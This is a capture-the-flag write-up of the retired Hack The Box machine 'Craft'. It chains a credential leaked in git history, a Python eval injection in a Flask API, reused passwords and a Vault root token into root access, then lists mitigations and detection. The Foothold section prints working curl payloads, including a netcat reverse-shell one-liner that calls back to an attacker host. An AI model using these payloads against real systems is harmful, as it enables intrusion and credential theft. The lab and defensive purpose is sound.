---
machine: Craft
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, web, flask, eval, gogs, git, docker, vault, ssh-otp]
---

# Craft — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology note; no real flags or credentials.

## TL;DR

Three names on one nginx: `craft.htb`, `api.craft.htb` (Flask) and `gogs.craft.htb`. The public `Craft/craft-api` repository leaves `dinesh`'s password in its history and an `eval()` on the `abv` field of `POST /api/brew/`, which gives code execution inside the API container. `settings.py` hands over the MySQL credentials in clear, the `user` table hands over all three passwords, and `gilfoyle` reuses his on Gogs, where his private `craft-infra` repository contains an SSH key. On the host, `gilfoyle`'s `~/.vault-token` has the `root` policy and the SSH secrets engine can issue an OTP to log in as `root`.

## Recon

```bash
nmap -p- --min-rate 5000 -oA nmap_all <IP>
nmap -p 22,443,6022 -sCV -oA nmap_svc <IP>
```

```text
22/tcp   open  ssh       OpenSSH 7.4p1 Debian 10+deb9u5
443/tcp  open  ssl/http  nginx 1.15.8
6022/tcp open  ssh       SSH-2.0-Go
```

- Port 6022 is not a system SSH: it is the Go server Gogs uses for `git` over SSH.
- The 443 certificate carries `commonName=craft.htb`, which confirms the intended vhost.
- Port 80 is not reachable and no PHP endpoint appears anywhere.

```bash
printf '%s\n' '<IP> craft.htb api.craft.htb gogs.craft.htb' | sudo tee -a /etc/hosts
```

## Enumeration

The landing page links to the API and to Gogs. On Gogs the `Craft/craft-api` repository is public, so the code and its whole history can be read without authenticating:

```bash
GIT_SSL_NO_VERIFY=true git clone https://gogs.craft.htb/Craft/craft-api.git
cd craft-api && git log --oneline
```

The commit that cleaned up the tests removed a credential that is still in the history:

```bash
git show a2d28ed        # tests/test.py
-    auth=('dinesh', '<PASSWORD>')
+    auth=('', '')
```

- `api.craft.htb/api/` is a Flask-RESTPlus API with `/auth/login`, `/auth/check` and `/brew/`.
- The JWT someone pasted in issue #2 is already expired: it is not an access path.
- Gogs has an `administrator` account, but no source recovers its password.

```bash
curl -sk -u 'dinesh:<PASSWORD>' https://api.craft.htb/api/auth/login
```

The response returns a token sent in the `X-Craft-API-Token` header.

## Foothold

The commit that "fixes" the ABV values introduces the real bug:

```python
# craft_api/api/brew/endpoints/brew.py
if eval('%s > 1' % request.json['abv']):
```

`abv` is concatenated into an `eval` call, so the field accepts Python code. First a sleep confirms it, then a reverse shell replaces it:

```bash
curl -sk -H 'Content-Type: application/json' -H "X-Craft-API-Token: <TOKEN>" \
  https://api.craft.htb/api/brew/ -XPOST \
  -d '{"id":1000,"brewer":"x","name":"x","style":"IPA","abv":"__import__(\"time\").sleep(5)"}'
```

```bash
curl -sk -H 'Content-Type: application/json' -H "X-Craft-API-Token: <TOKEN>" \
  https://api.craft.htb/api/brew/ -XPOST \
  -d '{"id":1000,"brewer":"x","name":"x","style":"IPA","abv":"__import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f\") or 1"}'
```

The shell comes back as `uid=0(root)`, but `/.dockerenv` exists: it is root **of the container**, not of the host. That distinction shapes the rest of the chain.

## Lateral movement

Inside the container, `settings.py` is not in the repository (it is in `.gitignore`) and holds the application secrets:

```text
CRAFT_API_SECRET        = '<SECRET>'
MYSQL_DATABASE_USER     = 'craft'
MYSQL_DATABASE_PASSWORD = '<PASSWORD>'
MYSQL_DATABASE_HOST     = 'db'
```

The repo also ships `dbtest.py` with `pymysql`; changed to `SELECT * FROM user` it returns the plaintext passwords of `dinesh`, `ebachman` and `gilfoyle`.

With `gilfoyle` Gogs grants access to a private `gilfoyle/craft-infra` repository holding the Docker infrastructure, the nginx and Flask configuration, and an SSH key:

```bash
GIT_SSL_NO_VERIFY=true git clone https://gilfoyle:<PASSWORD>@gogs.craft.htb/gilfoyle/craft-infra.git
ssh -i craft-infra/.ssh/id_rsa gilfoyle@craft.htb    # passphrase: the same password
```

The step from container to host is that key, not a Docker escape: the Gogs password and the key passphrase are the same one used for MySQL.

## Privilege escalation

`gilfoyle`'s home holds a Vault token with the `root` policy:

```bash
cat ~/.vault-token          # <TOKEN>
vault login                 # paste the token
vault write ssh/creds/root_otp ip=127.0.0.1
```

The response carries `username=root`, `port=22` and a single-use `key`. The `root_otp` role was created with `key_type=otp` and `default_user=root`, so that key is the password for a normal SSH login:

```bash
ssh root@127.0.0.1          # password = the returned OTP
# one-step alternative:
vault ssh -mode=otp -role=root_otp root@craft.htb
```

Why it works: the Vault SSH engine stores no passwords; it issues an OTP validated against the host at login time. With the `root` policy on Vault, the attacker can request credentials for any defined role, and one existed for `root`.

## Evidence

- `nmap` with the three ports and the `SSH-2.0-Go` banner.
- `git show a2d28ed` with the credential redacted.
- `id` and `ls -la /.dockerenv` inside the container.
- `vault write ssh/creds/root_otp` output with the `key` truncated.
- No flags, passwords or full token.

## Lessons learned

- Attributing the bug to CVE-2019-11043 is a mistake: that CVE affects PHP-FPM on nginx and this application is Flask. An `eval` in Python is enough and has no CVE.
- A public repository with history is a credential source: the full `git log` is part of the attack surface.
- Root in a container is not root on the host; look for infrastructure secrets rather than an escape.
- A Vault token with the `root` policy equals the credentials of every role in the SSH engine.
- Vault OTPs expire and are single-use: good to get in, useless for persistence.

## Mitigations and detection

- Never pass user input to `eval`/`exec`; validate `abv` as a decimal and reject anything else.
- Keep secrets out of the repository and its history (rotate what leaked), and use a manager with auditing instead of `settings.py` with plaintext passwords.
- Store `bcrypt`/`argon2` hashes in the database, never readable passwords.
- Restrict Vault policies: a user token must not be able to issue `root` credentials.
- Detection: `POST /api/brew/` with a non-numeric `abv` in the access log; `python` processes spawning `nc`/`/bin/sh`; `vault write ssh/creds/*` in the Vault audit log; SSH logins with `key_type=otp` for `root` in `auth.log`.

MITRE: T1190 (exploit public-facing application), T1059.006 (Python), T1552.001 (credentials in files), T1552.004 (private keys), T1213.003 (code repositories), T1021.004 (SSH), T1078 (valid accounts).

## References

- <https://snowscan.io/htb-writeup-craft>
- <https://0xrick.github.io/hack-the-box/craft>
- <https://cyllective.com/blog/posts/ctf-hackthebox-craft>
- <https://docs.hashicorp.com/vault/docs/secrets/ssh/one-time-ssh-passwords>
- <https://attack.mitre.org/techniques/T1190/>
